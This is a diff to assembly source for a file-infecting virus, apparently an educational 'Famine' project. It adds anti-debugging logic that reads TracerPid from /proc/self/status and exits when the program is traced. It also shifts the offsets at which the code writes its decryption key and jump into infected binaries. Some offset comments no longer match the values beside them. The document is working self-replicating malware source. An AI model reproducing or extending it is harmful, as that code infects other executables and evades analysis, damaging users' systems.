@@ -5,6 +5,42 @@ global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
 PUSH
+
+mov rbp, rsp
+sub rbp, famine_size  ; reserve famine_size bytes on the stack
+
+.check_status:		;open the /proc/self/status
+xor rdi ,rdi
+lea rdi, [rel pfile]
+mov rsi, O_RDONLY
+mov rax, _open
+syscall
+cmp rax, 0
+jl _exx
+
+lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
+mov rdi, rax   ; fd from previous read
+mov rdx, 110
+mov rax, _read
+syscall
+
+lea r12, STACK(famine.status_str)
+mov r11, 7
+.loop_status:
+inc r12
+cmp byte[r12], 0x0a
+jne .nope
+dec r11
+cmp r11, 0
+je .check_trcr
+.nope:
+loop .loop_status
+
+.check_trcr:
+add r12, 12
+cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
+jne _exx_pop
+
 jmp .enc_start
 DECYPHER
 
@@ -16,8 +52,6 @@ DECYPHER
 ;	POP
 ;	jne _exx
 
-	mov rbp, rsp
-	sub rbp, famine_size  ; reserve famine_size bytes on the stack
 .get_rand_key:
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
@@ -259,7 +293,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
 	lea rsi, [rel signature]
 	mov rdx, 1
-	add r10, 25 ; FILE EOF + 25 = JUMP OVER DECYPHER VAL OFFSET
+	add r10, 138 ; FILE EOF + 25 = JUMP OVER DECYPHER VAL OFFSET
 	syscall
 
 	pop r10
@@ -268,7 +302,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
 	lea rsi, STACK(famine.key)
 	mov rdx, 1
-	add r10, 30 ; FILE OEF + 30 = KEY OFFSET
+	add r10, 143 ; FILE OEF + 30 = KEY OFFSET
 	syscall
 
 	pop r10
@@ -277,7 +311,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
 	lea rsi, STACK(famine.factor)
 	mov rdx, 1
-	add r10, 66 ; FILE EOF + 80 = KEY FACTOR OFFSET
+	add r10, 179 ; FILE EOF + 80 = KEY FACTOR OFFSET
 	syscall
 
 
@@ -360,6 +394,7 @@ random			db			"/dev/random"
 enc_end:
 	db 0
 signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
+pfile			db			"/proc/self/status"
 famine_entry	dq			_start
 
 _exx_pop:
